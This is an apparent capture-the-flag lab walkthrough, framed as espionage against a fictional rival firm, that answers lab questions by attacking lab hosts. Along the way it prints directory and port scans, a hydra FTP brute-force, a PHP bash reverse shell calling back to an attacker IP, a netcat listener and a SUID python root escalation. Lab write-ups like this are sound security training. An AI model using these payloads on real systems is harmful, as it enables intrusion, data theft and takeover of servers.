# 02 - Revalry (Lab)

There is a striking competition between the software giants VertexWave International and Orbitronix Systems, as both continuously struggle for market dominance. Recently, VertexWave International has assigned you, a skilled hacker, a secret mission suitable for this critical task.

Your mission is to access sensitive data related to the sales and marketing strategies of Orbitronix Systems. This information is of vital importance because Orbitronix Systems has established a partnership with the famous Create Edge Advertising Agency, known for its innovative and highly effective marketing campaigns, in order to surpass VertexWave. 

Questions Walkthrough:
1. How many new clients does the CEO of Orbitronix Systems, Emily Johnson, claim they have gained?


![](../Assets/Pasted%20image%2020251028142452.png)

Answer: 3500

Question 2: What is the advertising budget of Orbitronix Systems in dollars?


To begin, we need to gather information about the target lets perform a gobuster scan.

```
gobuster dir -u "http://172.20.25.114" -w /usr/share/wordlists/dirb/common.txt -t 50 -x php,txt,html,bak,old
```


![](../Assets/Pasted%20image%2020251028143058.png)

We found a hidden directory `/ftp` lets explore it.

Here we found a file named `clients.csv` lets read it.
```
Company Name,Advertising Budget ($),Campaign Objective,Campaign Success,Target Audience,Campaign Duration (Months)
Innovatech Ltd,50000,Customer Retention,Yes,Long-term Customers,6
QuantumSoft,75000,Sales Increase,No,Professionals,3
...
Orbitronix Systems,225000,Brand Awareness,Yes,Young Adults,12
...
```
Answer: 225000

Question 3: Who is the target audience of the Orbitronix Systems advertising campaign?

Answer: Young Adults

Quesiton 4: What is the name of the secret marketing tool developed by Create Edge?

In order to access to this info we need to gain access to the server. Lets perform an nmap scan to identify open ports and services.

```
nmap -sSVC 172.20.58.90
```

![](../Assets/Pasted%20image%2020251028143206.png)

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
80/tcp open  http    Apache httpd 2.4.56 ((Debian))
|_http-server-header: Apache/2.4.56 (Debian)
|_http-title: CREATEEDGE
Service Info: OS: Unix
```
We found an FTP service on port 21 and a web server on port 80. Lets check the web server first.
Connecting anonymously to the FTP server didn't work so lets try a hydra attack on the default user `ftpuser`.

```
hydra -l ftpuser -P /usr/share/wordlists/rockyou.txt ftp://172.20.58.90
```

![](../Assets/Pasted%20image%2020251028143502.png)

Bingo we found that the password is `password` lets enumerate the ftp server.

```
ftp 172.20.58.90
```

![](../Assets/Pasted%20image%2020251028143555.png)

We just found the already known `clients.csv` lets try to upload a php reverse shell and access it via the website.
```
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.8.65.249/4444 0>&1'");
?>
```
Then we upload the shell with `put shell.php`
Create a netcat listener on our machine.
```
nc -lvnp 4444
```
And visit your browser on `http://172.20.58.90/ftp/shell.php`

Bingo now we have a reverse shell as www-data lets try to escalate privileges

Lets look for files with SETUID bit set.
```
find / -perm -4000 2>/dev/null
```

![](../Assets/Pasted%20image%2020251028144201.png)

Great we found that /usr/bin/python3.9 has the SUID bit set. Lets exploit it to get a root shell.
```
/usr/bin/python3.9 -c "import os;os.setuid(0);os.system('bash')"
```

![](../Assets/Pasted%20image%2020251028144408.png)

Great now lets enumerate

We found an interesting file in `/archive/meetings` lets read it.
```
cat /archive/meetings/orbitronix_system-2023-11-20.txt
```
Bingo here we found the name of the secret marketing tool.


![](Assets/Pasted%20image%2020251028144639.png)


Answer: InsightNexus AI

